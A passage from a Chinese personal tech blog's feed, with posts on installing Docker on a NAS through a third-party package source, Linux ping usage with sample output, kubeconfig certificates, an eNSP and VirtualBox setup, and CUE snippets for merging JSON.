alt="image.png"></p><p>安装完之后，就可以看到猫盘的指示灯亮了</p><p>但是docker还是显示下载失败</p><h3 id="尝试2：切换用户"><a href="#尝试2：切换用户" class="headerlink" title="尝试2：切换用户"></a>尝试2：切换用户</h3><p>刚开始是用一个自定义用户登录的系统<br>切换到admin用户下安装</p><p>安装docker还是显示下载失败</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://post.smzdm.com/p/akmv452r/"># NAS 篇一：群晖DSM7.0 安装docker</a><br><a href="https://imnks.com/1780.html"># 矿神群晖SPK套件中心 上线啦！支持DSM6、DSM7</a></p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】docker</title>
    <link href="/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker/"/>
    <url>/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>套件中心中没有docker，想要安装一个docker</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512220109.png" alt="image.png"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513000221.png" alt="image.png"></p><h2 id="添加第三方源"><a href="#添加第三方源" class="headerlink" title="添加第三方源"></a>添加第三方源</h2><p>修改配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512233229.png" alt="image.png"></p><p>套件中心—设置—套件来源—新增：名称随便取，位置把网址复制进去确认即可</p><p>DSM6.x矿神SPK套件源：<a href="https://imnks.com/go/aHR0cHM6Ly9zcGsuaW1ua3MuY29tLw">https://spk.imnks.com/</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235104.png" alt="image.png"></p><p>添加之后，可以看到左侧多了一个社群，然后在套件中心的社群搜索即可。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235200.png" alt="image.png"></p><p>点击“社群”，如果右侧没有东西的话，可以点击一下“刷新”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235234.png" alt="image.png"></p><p>搜索“docker”，直接安装</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235427.png" alt="image.png"></p><p>安装不上docker，为什么呢？显示下载docker失败</p><p>找<br>找<br>找</p><h3 id="尝试1：安装猫盘三合一修复"><a href="#尝试1：安装猫盘三合一修复" class="headerlink" title="尝试1：安装猫盘三合一修复"></a>尝试1：安装猫盘三合一修复</h3><p>安装完系统之后，发现指示灯不亮</p><p>不知道是否跟这个有关，安装下面套件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001425.png" alt="image.png"></p><p>安装完之后，就可以看到猫盘的指示灯亮了</p><p>但是docker还是显示下载失败</p><h3 id="尝试2：切换用户"><a href="#尝试2：切换用户" class="headerlink" title="尝试2：切换用户"></a>尝试2：切换用户</h3><p>刚开始是用一个自定义用户登录的系统<br>切换到admin用户下安装</p><p>安装docker还是显示下载失败</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://post.smzdm.com/p/akmv452r/"># NAS 篇一：群晖DSM7.0 安装docker</a><br><a href="https://imnks.com/1780.html"># 矿神群晖SPK套件中心 上线啦！支持DSM6、DSM7</a></p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】docker安装qBittorrent</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/</url>
    
    <content type="html"><![CDATA[<p>第三方下载工具，配置麻烦</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】docker安装qBittorrent</title>
    <link href="/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/"/>
    <url>/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/</url>
    
    <content type="html"><![CDATA[<p>第三方下载工具，配置麻烦</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】moments</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91moments/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91moments/</url>
    
    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213150.png" alt="image.png"></p><p>到“已安装”，点击“打开”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213239.png" alt="image.png"></p><p>会跳转到一个新的界面，显示如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213312.png" alt="image.png"></p><p>回到nas首页，点击“控制面板” “用户账号”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213708.png" alt="image.png"></p><p>回到moments界面，重新刷新，就可以进来啦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213834.png" alt="image.png"></p><p>然后就可以创建文件夹，上传照片啦~</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】todo(202305) kubeconfig文件</title>
    <link href="/2023/05/12/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/"/>
    <url>/2023/05/12/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>在Kubernetes中，kubeconfig是用于指定如何连接到Kubernetes集群的配置文件。kubeconfig包含了以下信息：</p><ol><li>Kubernetes API服务器的地址和访问凭据（用户名和密码、客户端证书和私钥等）。</li><li>用于授权访问Kubernetes API的凭据（例如，Token、BasicAuth等）。</li><li>Kubernetes集群的CA（证书颁发机构）证书，用于验证API服务器的TLS证书。</li></ol><p>kubeconfig中的证书包括客户端证书和CA证书。客户端证书用于对与Kubernetes API服务器的通信进行身份验证，它通常由CA证书签发。CA证书用于验证Kubernetes API服务器的TLS证书，以确保与服务器之间的通信是安全的。在kubeconfig中配置正确的客户端证书和CA证书可以确保与Kubernetes API服务器的连接是安全的，并且只有授权用户才能访问集群资源。</p><p>Kubernetes使用TLS来保护API服务器和各个组件之间的通信。客户端证书和CA证书都是X.509格式的数字证书，用于验证和加密这些通信。因此，在kubeconfig中正确配置这些证书是确保Kubernetes集群安全性的关键之一。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】ping常用命令</title>
    <link href="/2023/05/11/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ping%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/05/11/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ping%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -h</span><br>Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]<br>            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]<br>            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]<br>            [-w deadline] [-W <span class="hljs-built_in">timeout</span>] [hop1 ...] destination<br>Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]<br>             [-l preload] [-m mark] [-M pmtudisc_option]<br>             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]<br>             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]<br>             [-W <span class="hljs-built_in">timeout</span>] destination<br><br><br><br><span class="hljs-comment"># 01. 每隔0.6秒ping一次，一共ping 5次</span><br><span class="hljs-comment"># ping -c 5 -i 0.6 qq.com</span><br>PING qq.com (58.247.214.47) 56(84) bytes of data.<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=1 ttl=49 time=25.9 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=2 ttl=49 time=25.2 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=3 ttl=49 time=25.2 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=4 ttl=49 time=25.3 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=5 ttl=49 time=25.3 ms<br><br>--- qq.com ping statistics ---<br>5 packets transmitted, 5 received, 0% packet loss, time 2404ms<br>rtt min/avg/max/mdev = 25.266/25.432/25.964/0.302 ms<br>  <br><br><span class="hljs-comment">## 02. 测试-I</span><br><span class="hljs-comment"># ping -I 172.28.157.146 qq.com</span><br>PING qq.com (58.250.137.36) from 172.28.157.146 : 56(84) bytes of data.<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=1 ttl=47 time=42.6 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=2 ttl=47 time=42.3 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=3 ttl=47 time=42.2 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=4 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=5 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=6 ttl=47 time=43.2 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=7 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=8 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=9 ttl=47 time=51.2 ms<br>^C<br>--- qq.com ping statistics ---<br>9 packets transmitted, 9 received, 0% packet loss, time 8008ms<br>rtt min/avg/max/mdev = 42.162/43.368/51.248/2.805 ms<br><br><br><span class="hljs-comment"># ping -I 192.168.20.201 qq.com</span><br>PING qq.com (58.247.214.47) from 192.168.20.201 : 56(84) bytes of data.<br>^C<br>--- qq.com ping statistics ---<br>6 packets transmitted, 0 received, 100% packet loss, time 5108ms<br><br><br>mdev 就是 Mean Deviation 的缩写，它表示这些 ICMP 包的 RTT 偏离平均值的程度，这个值越大说明你的网速越不稳定。<br><br></code></pre></td></tr></table></figure><h2 id="ping-t"><a href="#ping-t" class="headerlink" title="ping -t"></a>ping -t</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -t www.baidu.com</span><br>Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]<br>            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]<br>            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]<br>            [-w deadline] [-W <span class="hljs-built_in">timeout</span>] [hop1 ...] destination<br>Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]<br>             [-l preload] [-m mark] [-M pmtudisc_option]<br>             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]<br>             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]<br>             [-W <span class="hljs-built_in">timeout</span>] destination<br><br></code></pre></td></tr></table></figure><h2 id="ping-n"><a href="#ping-n" class="headerlink" title="ping -n"></a>ping -n</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -n 2 192.168.3.100</span><br>PING 192.168.3.100 (192.168.3.100) 56(124) bytes of data.<br>^C<br>--- 192.168.3.100 ping statistics ---<br>9 packets transmitted, 0 received, 100% packet loss, time 8179ms<br><br><br><br><span class="hljs-comment"># ping 192.168.3.100 -n 2</span><br>PING 2 (0.0.0.2) 56(124) bytes of data.<br>^C<br>--- 2 ping statistics ---<br>7 packets transmitted, 0 received, 100% packet loss, time 6139ms<br><br>[root@ningan dubhe-manager]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><h2 id="ping-c"><a href="#ping-c" class="headerlink" title="ping -c"></a>ping -c</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping 192.168.3.100 -c 5</span><br>PING 192.168.3.100 (192.168.3.100) 56(84) bytes of data.<br>64 bytes from 192.168.3.100: icmp_seq=1 ttl=52 time=26.0 ms<br>64 bytes from 192.168.3.100: icmp_seq=2 ttl=52 time=26.5 ms<br>64 bytes from 192.168.3.100: icmp_seq=3 ttl=52 time=25.7 ms<br>64 bytes from 192.168.3.100: icmp_seq=4 ttl=52 time=26.9 ms<br>64 bytes from 192.168.3.100: icmp_seq=5 ttl=52 time=26.6 ms<br><br>--- 192.168.3.100 ping statistics ---<br>5 packets transmitted, 5 received, 0% packet loss, time 4005ms<br>rtt min/avg/max/mdev = 25.753/26.369/26.920/0.443 ms<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【软考】环境搭建</title>
    <link href="/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>wireshark  2.6.6<br>ensp v1.3.00<br>oracle vm virtualbox 5.2.40</p><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><h3 id="virtualbox"><a href="#virtualbox" class="headerlink" title="virtualbox"></a>virtualbox</h3><p><a href="https://www.virtualbox.org/wiki/Download_Old_Builds_5_2">Download_Old_Builds_5_2 – Oracle VM VirtualBox</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002536.png" alt="image.png"></p><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p><a href="https://www.wireshark.org/download.html">Wireshark · Download</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002852.png" alt="image.png"></p><h3 id="ensp"><a href="#ensp" class="headerlink" title="ensp"></a>ensp</h3><h3 id="winpcap"><a href="#winpcap" class="headerlink" title="winpcap"></a>winpcap</h3><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><h3 id="报错信息-所有设备无法启动，错误代码40"><a href="#报错信息-所有设备无法启动，错误代码40" class="headerlink" title="报错信息 所有设备无法启动，错误代码40"></a>报错信息 <strong>所有设备无法启动，错误代码40</strong></h3><p>虚拟网卡的名称为“VirtualBox Host-Only Ethernet Adapter #2”，可尝试点击eNSP主界面“菜单-工具-注册设备”重新注册设备。</p><p>注意需要删除所有设备</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202305) json marshal和unmarshal</title>
    <link href="/2023/05/08/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202305)%20json%20marshal%E5%92%8Cunmarshal/"/>
    <url>/2023/05/08/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202305)%20json%20marshal%E5%92%8Cunmarshal/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>初始有一个json<br>需要cue文件来帮助拼接一段形成一个新的json</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="简单版"><a href="#简单版" class="headerlink" title="简单版"></a>简单版</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508170625.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// 原json Marshal之后的字符串<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: 先unmarshal<br>b: json.Unmarshal(a)<br><br>// step2：拼接新的内容<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: <span class="hljs-string">&quot;new&quot;</span>   // 新内容<br>&#125;<br><br>// step3: 转成字符串<br>cMarshal: json.Marshal(c)<br><br><br></code></pre></td></tr></table></figure><h3 id="复杂版"><a href="#复杂版" class="headerlink" title="复杂版"></a>复杂版</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508171655.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// 原json Marshal之后的字符串<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: 先unmarshal<br>b: json.Unmarshal(a)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>&#125;<br><br>// step2：拼接新的内容<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // 新内容<br>&#125;<br><br>// step3: 转成字符串<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="进阶版2：一级拼接"><a href="#进阶版2：一级拼接" class="headerlink" title="进阶版2：一级拼接"></a>进阶版2：一级拼接</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508172626.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// 原json Marshal之后的字符串<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: 先unmarshal<br>b: json.Unmarshal(a)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>    <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>&#125;<br><br>// step2：拼接新的内容<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // 新内容<br>&#125;<br><br>// step3: 转成字符串<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="进阶版2的另一种写法"><a href="#进阶版2的另一种写法" class="headerlink" title="进阶版2的另一种写法"></a>进阶版2的另一种写法</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508182001.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>self: &#123;<br>    // step1: 先unmarshal<br>    b: json.Unmarshal(<span class="hljs-string">&quot;\(global.a)&quot;</span>)<br>    <br>    testValue:  &#123;<br>        <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>        <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>        <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    &#125;<br>    <br>    // step2：拼接新的内容<br>    c: &#123;<br>        b<br>        <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // 新内容<br>    &#125;<br>&#125;<br><br>global: &#123;<br>    // 原json Marshal之后的字符串<br>    a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    <br>    <br>    // step3: 转成字符串<br>    cMarshal: json.Marshal(self.c)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="进阶版3：两级拼接"><a href="#进阶版3：两级拼接" class="headerlink" title="进阶版3：两级拼接"></a>进阶版3：两级拼接</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508191318.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// 原json Marshal之后的字符串<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>a2: <span class="hljs-string">&quot;&#123;\&quot;test1bbbb\&quot;:\&quot;1\&quot;,\&quot;test2bbbb\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: 先unmarshal<br>b: json.Unmarshal(a)<br>b2: json.Unmarshal(a2)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>    <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    b2<br>&#125;<br><br>// step2：拼接新的内容<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // 新内容<br>&#125;<br><br>// step3: 转成字符串<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="进阶版3的另一种写法"><a href="#进阶版3的另一种写法" class="headerlink" title="进阶版3的另一种写法"></a>进阶版3的另一种写法</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508191505.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>self: &#123;<br>    // step1: 先unmarshal<br>    b: json.Unmarshal(<span class="hljs-string">&quot;\(global.a)&quot;</span>)<br>    b2: json.Unmarshal(<span class="hljs-string">&quot;\(global.a2)&quot;</span>)<br>    <br>    testValue:  &#123;<br>        b2<br>        <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>        <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>        <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    &#125;<br>    <br>    // step2：拼接新的内容<br>    c: &#123;<br>        b<br>        <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // 新内容<br>    &#125;<br>&#125;<br><br><br>global: &#123;<br>    // 原json Marshal之后的字符串<br>    a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    a2: <span 